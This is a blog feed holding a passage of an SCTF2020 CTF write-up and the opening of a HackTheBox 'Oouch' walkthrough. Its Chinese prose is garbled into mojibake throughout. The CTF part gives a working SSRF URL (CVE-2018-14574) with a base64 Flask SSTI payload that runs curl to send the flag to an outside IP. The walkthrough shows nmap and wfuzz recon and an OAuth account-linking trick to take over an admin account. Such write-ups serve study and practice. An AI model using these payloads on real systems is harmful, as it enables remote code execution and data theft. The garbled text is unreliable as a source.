ä¸ºåœ¨web2å­˜åœ¨æ˜æ˜¾çš„ssti,æˆ‘ä»¬æƒ³è¦è¾¾æˆsstiå¿…é¡»è¦åœ¨è¿™å¾€127.0.0.1è·‘åœ¨8000çš„flaskæ‰“ä¸€å‘ã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬åˆ©ç”¨CVE-2018-14574è¿™ä¸ªä»»æ„urlè·³è½¬ï¼Œå³å¯ssrf.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.104.19.182//127%2e0.0.1:8000/rpc?methods=POST&amp;data=eyJudW0xIjoiIiwibnVtMiI6IiIsInN5bWJvbHMiOiJ7XHUwMDdiJzEnLl9fY2xhc3NfXy5tcm8oKVstMV0uX19zdWJjbGFzc2VzX18oKVs2NF0uX19pbml0X18uX19nbG9iYWxzX19bJ19fYnVpbHRpbnNfXyddWydldmFsJ10oXCJfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnY3VybCAxMjAuMjcuMjQ2LjIwMi9gL3JlYWRmbGFnYCAnKVwiKX1cdTAwN2QifQ==</span><br></pre></td></tr></table></figure><p>åé¢æ‰“flaskçš„payloadä¸»è¦æ˜¯è§£å†³å¤§æ‹¬å·çš„é—®é¢˜ã€‚å› ä¸ºå®ƒæ˜¯é€šè¿‡get_jsonè·å–æ•°æ®çš„,å› æ­¤å…¶å®å¹¶ä¸å­˜åœ¨wafçš„é—®é¢˜ã€‚åªè¦ç”¨unicodeç»•è¿‡å³å¯ã€‚è¿™ç‚¹åœ¨Node.jsè·Ÿphpçš„json_decode()ç»•è¿‡æ—¶åº”è¯¥ç»å¸¸ç”¨åˆ°ã€‚</p><p>å¹¶ä¸”ï¼Œç”±äºweb2è·å–çš„å‚æ•°è¦æ±‚num1,2ä¸èƒ½æœ‰å°å†™å­—æ¯ã€‚symbolså¿…é¡»èƒ½åŒ¹é…åˆ°<code>+\-*/</code>ä¹‹ä¸€ã€‚è¿™ä¸ªpayloadä¹Ÿç›´æ¥ç»•è¿‡äº†waf.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"num1"</span>:<span class="string">""</span>,<span class="attr">"num2"</span>:<span class="string">""</span>,<span class="attr">"symbols"</span>:<span class="string">"&#123;\u007b [].__class__.__base__.__subclasses__()[64].__init__.__globals__['__builtins__']['eval'](\"__import__('os').system('curl xxxx/`/readflag` ')\")&#125;\u007d"</span>&#125;</span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥ç”¨<code>num1={</code>,<code>symbols={PAYLOAD}</code>,num2=<code>}</code>æ¥è§£å†³é—®é¢˜ã€‚è‡³äºflaskè·å–åˆ°å«catch_warningsæ¨¡ç»„è¿›è€Œè·å–åˆ°evalçš„æ–¹æ³•ä¹Ÿæ˜¯è€ç”Ÿå¸¸è°ˆã€‚FUZZä¸‹å°±å¥½äº†ã€‚</p><p><img src="/2020/07/05/SCTF2020-writeup/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ‰€ä»¥è‡ªå·±ä¸»è¦æ˜¯å› ä¸ºdjangoå¤ªè¿‡é™Œç”Ÿ,å¯¼è‡´æ²¡èƒ½ä¸‹æ‰‹,è·‘å»çœ‹asisäº†ã€‚å‰©ä¸‹çš„éš¾åº¦å…¶å®è¿˜å¥½ã€‚</p><h1 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h1><p>æš‚æ—¶å…ˆæŠŠwpæ”¾è¿™äº›å§ã€‚äº‰å–æ˜å¤©è‡ªå·±å†å¤šå¤ç°ä¸‹json_hubã€‚å› ä¸ºåˆšå¥½æŠŠhtbçš„travelåšå®Œäº†ï¼Œç®—æ˜¯äº†å´å¿ƒå¤´ä¸€ä»¶äº‹ã€‚åº”è¯¥èƒ½æŠ½ç©ºåšäº›å¤ç°å­¦ä¹ äº†ã€‚</p><p>å…³äºæœ€è¿‘çš„æ¯”èµ›å¿ƒé‡Œå…¶å®ä¸€ç›´æœ‰ç‚¹éš¾å—ã€‚æˆ˜é˜Ÿå·²ç»å¼€å§‹æ¢å±Šäº†,webæ–°ä¸€å±Šçš„å­¦å¼Ÿè¿˜æ²¡ä¸Šæ¥ï¼Œä½†æ˜¯å¹³æ—¶åœ¨æ‰“æ¯”èµ›çš„webæ‰‹å·²ç»å‡ ä¹å°±åªæœ‰æˆ‘è·Ÿzjyäº†ã€‚æ¯æ¬¡xctfæ‰“åˆ°ä¸€åŠæ€»æ„Ÿè§‰å½¢å•å½±åª,ç›¸æ¯”äººå°‘è€Œè¨€æ›´å¤šçš„æ˜¯æ„Ÿæ…¨è‡ªå·±tclã€‚æ¯æ¬¡éƒ½ä¼šé‡åˆ°æ„Ÿè§‰è‡ªå·±æ€ä¹ˆæ²¡æ—©ç‚¹å­¦çš„çŸ¥è¯†ã€‚å¿ƒé‡Œè¿‡æ„ä¸å»ã€‚</p><p>ä¸è¿‡æ¯•ç«Ÿæ‰“æ¯”èµ›æ˜¯å­¦ä¹ çš„è¿‡ç¨‹,æ¯æ¬¡æ¯”èµ›ç¡®å®éƒ½èƒ½æ¥è§¦åˆ°æ–°å§¿åŠ¿ä»¥åŠåæ€ä¸‹è‡ªå·±çš„ä¸è¶³ã€‚ç°åœ¨æ—¢ç„¶åˆ°æš‘å‡äº†ï¼Œæ˜¯æ—¶å€™å¥½å¥½ç³»ç»Ÿå­¦ä¹ ä¸‹æ–°çŸ¥è¯†ï¼š<br>1.php: ä¸€ä¸ªæ˜¯phpauditlabsäº‰å–æ¯æ¬¡éƒ½å®¡ä¸€é;ç„¶ålaravelè·Ÿtpè¿™æ ·çš„æ¡†æ¶è¿‡ä¸€ä¸‹ã€‚å…¶å®wordpressä¹Ÿå¯ä»¥æ¥è§¦ä¸‹ï¼Œæ­£å¥½æœ€è¿‘ç¢°åˆ°äº†ã€‚<br>2.hackthebox: ä¸ç”¨åšé‚£ä¹ˆæ€¥,ç°å½¹é¶æœºå‰©ä¸‹æ²¡åšçš„åŸºæœ¬ä¸Šéƒ½æ˜¯hardåŠä»¥ä¸Šéš¾åº¦äº†ã€‚å¯ä»¥æ…¢æ…¢æ¥ã€‚<br>3.java: å‡ ä¹ä»é›¶å¼€å§‹çš„javaå­¦ä¹ (æˆ‘è‡ªå·±çˆ¬)<br>4.python: djangoçš„è®¤è¯†å­¦ä¹ <br>5.Nodejs: ä¿æŒç°çŠ¶ã€‚å¤šç»ƒæ‰‹ä¸‹Nodejsçš„å¼€å‘</p><p>å·®ä¸å¤šå°±è¿™æ ·äº†ã€‚äº‰å–å‡æœŸæœŸé—´å¤šæ›´ä¸‹æ–‡ç« æ€»ç»“çŸ¥è¯†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Oouch</title>
      <link href="2020/07/01/hackthebox-Oouch/"/>
      <url>2020/07/01/hackthebox-Oouch/</url>
      
        <content type="html"><![CDATA[<p>Oouché¶æœºçš„éš¾åº¦ç›¸æ¯”æœ€è¿‘åšå®Œçš„ä¸¤ä¸ªhard machine Quickè·ŸForwardslashè€Œè¨€æœ‰è¿‡ä¹‹è€Œæ— ä¸åŠã€‚ç”šè‡³äºæ„Ÿè§‰å¯èƒ½æ¥è¿‘åˆ°Insaneéš¾åº¦äº†ã€‚ä»webç•Œé¢ä¸‹æ‰‹æ—¶é‡åˆ°å¾ˆå¤šä¸ç¨³å®šçš„é—®é¢˜ï¼Œè€Œä¹‹åä»userææƒåˆ°rootæ›´æ˜¯å‡ºç°ç„å­¦é—®é¢˜ï¼Œä¸€æ¨¡ä¸€æ ·çš„çš„payloadå¤´ä¸€å¤©å¤±è´¥ç¬¬äºŒå¤©å°±æˆäº†ã€‚ä½†æ˜¯æ€»å½’å­¦åˆ°äº†ä¸å°‘æ–°çŸ¥è¯†ï¼Œæ‰€ä»¥èµ¶ç´§æ€»ç»“ä¸‹ã€‚</p><a id="more"></a><p><img src="/2020/07/01/hackthebox-Oouch/head.PNG" class="lazyload" data-srcset="head.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><ul><li>é¶æœºip: 10.10.10.186</li><li>æ”»å‡»æœº: 10.10.14.40</li></ul><h2 id="initial-foothold-to-user"><a href="#initial-foothold-to-user" class="headerlink" title="initial foothold to user"></a>initial foothold to user</h2><ul><li>nmap </li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Sun Jun 28 15:53:13 2020 as: nmap -sC -sV -oA nmap/oouch 10.10.10.177</span></span><br><span class="line">WARNING: Service 10.10.10.177:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.177</span><br><span class="line">Host is up (0.43s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 10.10.14.46</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      Session bandwidth <span class="built_in">limit</span> <span class="keyword">in</span> byte/s is 30000</span><br><span class="line">|      Session timeout <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)</span><br><span class="line">|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)</span><br><span class="line">5000/tcp open  http    nginx 1.14.2</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">| http-title: Welcome to Oouch</span><br><span class="line">|_Requested resource was http://10.10.10.177:5000/login?next=%2F</span><br><span class="line">8000/tcp open  rtsp</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   FourOhFourRequest, GetRequest, HTTPOptions: </span><br><span class="line">|     HTTP/1.0 400 Bad Request</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Vary: Authorization</span><br><span class="line">|     &lt;h1&gt;Bad Request (400)&lt;/h1&gt;</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     RTSP/1.0 400 Bad Request</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Vary: Authorization</span><br><span class="line">|     &lt;h1&gt;Bad Request (400)&lt;/h1&gt;</span><br><span class="line">|   SIPOptions: </span><br><span class="line">|     SIP/2.0 400 Bad Request</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Vary: Authorization</span><br><span class="line">|_    &lt;h1&gt;Bad Request (400)&lt;/h1&gt;</span><br><span class="line">|_http-title: Site doesn<span class="string">'t have a title (text/html).</span></span><br><span class="line"><span class="string">|_rtsp-methods: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span></span><br><span class="line"><span class="string">SF-Port8000-TCP:V=7.80%I=7%D=6/28%Time=5EF84CE8%P=x86_64-pc-linux-gnu%r(Ge</span></span><br><span class="line"><span class="string">SF:tRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex</span></span><br><span class="line"><span class="string">SF:t/html\r\nVary:\x20Authorization\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(400\)&lt;/</span></span><br><span class="line"><span class="string">SF:h1&gt;")%r(FourOhFourRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nCon</span></span><br><span class="line"><span class="string">SF:tent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n&lt;h1&gt;Bad\x20Req</span></span><br><span class="line"><span class="string">SF:uest\x20\(400\)&lt;/h1&gt;")%r(HTTPOptions,64,"HTTP/1\.0\x20400\x20Bad\x20Req</span></span><br><span class="line"><span class="string">SF:uest\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n&lt;h1</span></span><br><span class="line"><span class="string">SF:&gt;Bad\x20Request\x20\(400\)&lt;/h1&gt;")%r(RTSPRequest,64,"RTSP/1\.0\x20400\x2</span></span><br><span class="line"><span class="string">SF:0Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization</span></span><br><span class="line"><span class="string">SF:\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(400\)&lt;/h1&gt;")%r(SIPOptions,63,"SIP/2\.0\</span></span><br><span class="line"><span class="string">SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Auth</span></span><br><span class="line"><span class="string">SF:orization\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(400\)&lt;/h1&gt;");</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string"># Nmap done at Sun Jun 28 15:55:59 2020 -- 1 IP address (1 host up) scanned in 166.01 seconds</span></span><br></pre></td></tr></table></figure><p>21,22,5000,8000 ç«¯å£å¼€æ”¾ã€‚å¹¶ä¸”21ç«¯å£ftpå¯ä»¥åŒ¿åç™»å½•ã€‚</p><ul><li>ftp annoymous login</li></ul><p>ftpåŒ¿åç™»å½•æä¸‹æ¥ä¸€ä¸ªproject.txt<br>get file project.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Flask -&gt; Consumer</span><br><span class="line">Django -&gt; Authorization Server</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§nmapçš„ç»“æœï¼Œ5000è·Ÿ8000æœ‰ä¸¤ä¸ªwebæœåŠ¡ï¼Œçœ‹èµ·æ¥ä¼¼ä¹æ˜¯flaskè·Ÿdjango.</p><ul><li>enumeration</li></ul><p>æ­¤æ—¶ä»5000ç«¯å£çš„æœåŠ¡å…¥æ‰‹ã€‚é¦–å…ˆæ³¨å†Œç™»å½•åå‘ç°æä¾›äº†å‡ ä¸ªæ¯”è¾ƒæ²¡ç”¨çš„åŠŸèƒ½ï¼Œå…¶ä¸­<code>/document</code>è·¯ç”±çš„å†…å®¹æç¤ºåªæœ‰adminèƒ½ç”¨ã€‚<code>/profile</code>æ˜¾ç¤ºæˆ‘ä»¬å¯ä»¥é“¾æ¥è´¦æˆ·ï¼Œä½†æ˜¯ä¸çŸ¥é“è¦æ€ä¹ˆåšã€‚<code>/contact</code>å¤„ä¼¼ä¹å¯ä»¥è®©adminæ¥å—æˆ‘ä»¬çš„urlç„¶åé€ æˆssrf.ä½†æ˜¯è¿™äº›éƒ½è¿˜æ²¡æœ‰å¯å…·ä½“ä¸‹æ‰‹çš„åœ°æ–¹ã€‚</p><p>è€Œ8000ç«¯å£çš„æœåŠ¡ç›´æ¥è®¿é—®è¿”å›400.ä¼¼ä¹åˆ°è¿™ä¸€æ­¥å°±å¡ä½äº†ã€‚</p><p>äºæ˜¯å°è¯•çˆ†ç ´è·¯ç”±ï¼Œæœ‰äº†æ„å¤–çš„æ”¶è·ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wordlists/dirb/common.txt -u <span class="string">'http://10.10.10.177:5000/FUZZ'</span> --hc 404 -t 70</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4.5 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.177:5000/FUZZ</span><br><span class="line">Total requests: 4614</span><br><span class="line"></span><br><span class="line">===================================================================</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload                                                                                                                    </span><br><span class="line">===================================================================</span><br><span class="line"></span><br><span class="line">000000223:   302        3 L      24 W     247 Ch      <span class="string">"about"</span></span><br><span class="line">000000001:   302        3 L      24 W     237 Ch      <span class="string">""</span>                                                                        </span><br><span class="line">000001013:   302        3 L      24 W     251 Ch      <span class="string">"contact"</span>                                                                         </span><br><span class="line">000001325:   302        3 L      24 W     255 Ch      <span class="string">"documents"</span>                                                                        </span><br><span class="line">000001908:   302        3 L      24 W     245 Ch      <span class="string">"home"</span>                                                                               </span><br><span class="line">000002347:   200        54 L     110 W    1828 Ch     <span class="string">"login"</span>                                                                               </span><br><span class="line">000002362:   302        3 L      24 W     219 Ch      <span class="string">"logout"</span>                                                                             </span><br><span class="line">000002722:   302        3 L      24 W     247 Ch      <span class="string">"oauth"</span>                                                                               </span><br><span class="line">000003160:   302        3 L      24 W     251 Ch      <span class="string">"profile"</span>                                                                           </span><br><span class="line">000003341:   200        63 L     124 W    2109 Ch     <span class="string">"register"</span></span><br></pre></td></tr></table></figure><p>é™¤äº†ä¹‹å‰å‡ ä¸ªåŠŸèƒ½å¤–è¿˜æœ‰<code>oauth</code>ã€‚(è¿™é‡Œæ˜¯æ¢äº†ä¸ªå¹³æ—¶ä¸ç”¨çš„dirbè¯å…¸çˆ†å‡ºæ¥çš„ï¼Œè™½ç„¶å†…å®¹å°‘ä½†æœ‰æ—¶æ°å¥½å°±èƒ½å¾—åˆ°æƒ³è¦çš„ä¿¡æ¯)</p><p>è®¿é—®oauth<br><img src="/2020/07/01/hackthebox-Oouch/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¾—åˆ°äº†5000ç«¯å£ä¸8000ç«¯å£çš„å…·ä½“åŸŸåã€‚äºæ˜¯åŠ åˆ°<code>/etc/hosts</code>ä¸­ã€‚</p><p>å†æ¥ç€å°è¯•äº†ä¸¤ä¸ªé“¾æ¥å,æˆ‘å‘ç°å¤§æ¦‚å®ç°äº†ä¸€ä¸ªauthorizeçš„è¿‡ç¨‹ã€‚åŠ ä¸Šoauthçš„è¿™ä¸ªåè¯ï¼Œæˆ‘å†³å®šå…ˆå»googleä¸€ä¸‹ï¼Œäºæ˜¯å¤§è‡´èƒ½å¤Ÿç†è§£ï¼Œè¿™æ˜¯ä¸€ä¸ªå®ç°äº†<code>oauth2</code>åŠŸèƒ½çš„åœºæ™¯ã€‚</p><p>oauthçš„æµç¨‹æ˜¯è¿™æ ·çš„</p><blockquote><p>1.The application requests authorization to access service resources from the user. The application needs to provide the client ID, client secret, redirect URI and the required scopes.<br>2.If the user authorizes the request, the application receives an authorization grant<br>3.The application ** requests an access token from the authorization server ** by presenting authentication of its own identity, and the authorization grant<br>4.If the application identity is authenticated and the authorization grant is valid, the authorization server issues the access and refresh (if required) token to the application. Authorization is complete.<br>5.The application requests the resource from the resource server and presents the access token for authentication<br>6.If the access token is valid, the resource server serves the resource to the application</p></blockquote><p>æŒ‰ç…§é˜®ä¸€å³°è€å¸ˆçš„ç†è§£ï¼Œå°±æ˜¯åœ¨å®¢æˆ·ç«¯ä¸æœåŠ¡å•†ä¹‹é—´åŠ ä¸Šäº†ä¸€ä¸ªæˆæƒå±‚ï¼Œè¿™é‡Œå…·ä½“è€Œè¨€ï¼Œå°±æ˜¯æˆ‘ä»¬åœ¨æˆæƒåï¼Œå¯ä»¥è®©8000ç«¯å£çš„è´¦å·è·Ÿ5000çš„è´¦å·ç»‘å®šåœ¨ä¸€èµ·ã€‚æ¯æ¬¡è¿›è¡Œæ“ä½œæ—¶éƒ½ä¼šæœ‰è¿™æ ·çš„ä¸­é—´é¡µé¢<br><img src="/2020/07/01/hackthebox-Oouch/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ ¹æ®<code>consumer</code>é‡Œ<code>oauth</code>çš„è¦æ±‚ã€‚æˆ‘ä»¬åº”è¯¥å…ˆå»<code>oauth/connect</code>,ç„¶åå½“æˆ‘ä»¬åœ¨<code>authorization</code>é‡Œæ³¨å†Œå®Œè´¦å·åï¼Œè®¿é—®<code>oauth/login</code>å°±å®Œæˆäº†è´¦å·çš„å…³è”ã€‚</p><p>è€Œè¿™é‡Œå°±äº§ç”Ÿäº†ä¸€ä¸ªæå‡æƒé™çš„å¯èƒ½ã€‚oauthçš„ç‰¹ç‚¹åœ¨äºï¼Œæˆ‘ä»¬è®¿é—®<code>oauth/login</code>è¿›è¡Œè´¦å·å…³è”æ—¶ï¼Œä¸­é—´å±‚æ˜¯æ ¹æ®æˆ‘ä»¬ä¹‹å‰connectæ—¶ä¼ è¾“çš„tokenè¿›è¡Œç›®æ ‡åˆ¤å®šçš„(å…·ä½“æŠ“åŒ…äº†è§£)ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬ä»¥adminçš„èº«ä»½ä¼ ä¸€ä¸ªæœ‰æ•ˆtokenï¼Œä¹‹åè¿æ¥è´¦å·æ—¶å°±ä¼šæŠŠæˆ‘ä»¬åœ¨<code>authorization</code>çš„è´¦å·ä¸<code>consumer</code>å¤„adminçš„è´¦å·ç›¸å…³è”ã€‚<br>è¿™æ˜¯æ¯ä¸€æ¬¡è¿›è¡Œconnectæ—¶,æˆ‘ä»¬å®¢æˆ·ç«¯ä¼šå‘å‘çš„ä¸€ä¸ªå«æœ‰tokençš„åŒ…<br><img src="/2020/07/01/hackthebox-Oouch/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™æ—¶ä¹‹å‰æåˆ°çš„<code>/contact</code>å°±æ´¾ä¸Šç”¨åœºäº†ã€‚æˆ‘ä»¬burpæŠ“åŒ…å¹¶æŠŠè¿™ä¸ªä¼ è¾“<code>token</code>çš„åŒ…dropæ‰ã€‚è½¬è€Œåˆ©ç”¨adminçš„contactå®Œæˆè¿™æ¬¡tokenå‘é€ã€‚æ¥ä¸‹æ¥å†æ¬¡ç‚¹å‡»<code>oauth/login</code>ï¼Œå°±èƒ½è§¦å‘è¿æ¥,ç»‘å®šadminè´¦æˆ·ã€‚<br><img src="/2020/07/01/hackthebox-Oouch/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç°åœ¨æˆ‘ä»¬å·²ç»ç»‘å®šqtcè´¦æˆ·äº†ã€‚å¹¶ä¸”åœ¨documentå¤„å‘ç°æç¤º<br><img src="/2020/07/01/hackthebox-Oouch/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><ul><li>ä¸€ä¸ªè´¦å·ã€‚åŠŸèƒ½æ˜¯application register</li><li>ä¸€ä¸ªè·¯ç”± /api/get_user å¦å¤–/oauth/authorize æ”¯æŒgetè¯·æ±‚</li><li>ä¼¼ä¹å¯ä»¥æœ‰é€”å¾„å¯ä»¥å¾—åˆ°sshkey</li></ul><p>çœ‹æ¥æ¥ä¸‹æ¥è¦è½¬æˆ˜8000ç«¯å£çš„<code>authorization.oouch.htb</code>äº†ã€‚<br>é¦–å…ˆä½œä¸ºæ™®é€šç”¨æˆ·ï¼Œ8000ç«¯å£é»˜è®¤çš„ä¸¤ä¸ªè·¯ç”±éƒ½æ²¡æœ‰åŠæ³•ä½¿ç”¨ã€‚é‚£ä¹ˆç°åœ¨å…ˆæƒ³åŠæ³•ç”¨ä¸Šæˆ‘ä»¬ä¹‹å‰å¾—åˆ°çš„ç”¨æˆ·å¯†ç ã€‚</p><p>æ¥ç€çˆ†ç ´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt  -u http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;FUZZ   --hc 404 -t 80</span><br><span class="line">wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt  -u http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;oauth&#x2F;FUZZ   --hc 404 -t 80</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªæ— 